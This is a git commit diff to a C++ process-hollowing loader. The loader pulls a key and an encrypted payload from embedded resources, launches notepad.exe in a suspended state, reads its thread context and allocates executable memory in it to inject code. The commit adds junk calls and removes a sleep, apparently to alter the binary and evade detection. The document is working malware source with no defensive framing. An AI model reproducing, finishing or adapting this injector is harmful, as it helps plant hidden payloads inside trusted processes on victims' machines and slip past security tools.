3b35912733ae55fa82f2a0ea10ffca38fd59b13b
dhanush <114467712+dagowda@users.noreply.github.com>
2024-12-31 08:36:02 -0500

    Update hollowing.cpp

--- dummyda/hollowing.cpp
+++ dummyda/hollowing.cpp
@@ -2,9 +2,17 @@
 #include <windows.h>
 #include <tlhelp32.h>
 #include <wincrypt.h>
+#include <iostream>
+#include <random>
+#include <cstdlib>
+#include <ctime>
 
 #pragma comment (lib, "crypt32.lib")
 #pragma comment (lib, "user32.lib")
+
+void generate_time() {
+    std::srand(static_cast<unsigned int>(std::time(0)));  
+}
 
 void loadResource_with(const char* renamer, char** data, DWORD* size) {
     HMODULE hModule = GetModuleHandle(NULL);
@@ -15,20 +23,24 @@ void loadResource_with(const char* renamer, char** data, DWORD* size) {
 }
 
 int main() {
-    Sleep(4000);
+    
+    const char* processPath = "C:\\Windows\\System32\\notepad.exe";
     char* key101k;
     DWORD key101kLen;
     loadResource_with("dhanushkey1", &key101k, &key101kLen);
     char* code199k;
     DWORD code199kLen;
     loadResource_with("dhanushcode56", &code199k, &code199kLen);
+     const char* processptaah = "C:\\Windows\\System32\\notepad.exe";
     STARTUPINFO si = {0};
     PROCESS_INFORMATION pi = {0};
     si.cb = sizeof(si);
-    CreateProcess("C:\\Windows\\System32\\notepad.exe", NULL, NULL, NULL, FALSE,CREATE_SUSPENDED, NULL, NULL, &si, &pi);
+    CreateProcess(processptaah, NULL, NULL, NULL, FALSE,CREATE_SUSPENDED, NULL, NULL, &si, &pi);
+    GetTickCount();
+    
     CONTEXT ctx = {0};
     ctx.ContextFlags = CONTEXT_FULL;
-
+    GetTickCount();
     GetThreadContext(pi.hThread, &ctx);
 
     LPVOID memlo = VirtualAllocEx(pi.hProcess, NULL, code199kLen,MEM_COMMIT | MEM_RESERVE, PAGE_EXECUTE_READWRITE);
